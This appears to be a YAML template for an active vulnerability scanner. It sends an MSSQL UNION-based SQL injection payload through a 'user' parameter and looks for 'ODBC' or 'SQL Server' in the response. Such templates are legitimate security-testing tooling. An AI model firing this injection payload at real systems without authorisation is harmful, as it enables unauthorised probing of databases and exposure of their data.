id: patt-sqli-mssql-union-01-user
name: 'PATT sqli patt-sqli-mssql-union-01 via user'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - dotnet
description: 'PATT MSSQL UNION @@version. [patt:patt-sqli-mssql-union-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MSSQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      user:
        - ''' UNION SELECT NULL,@@version-- -'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
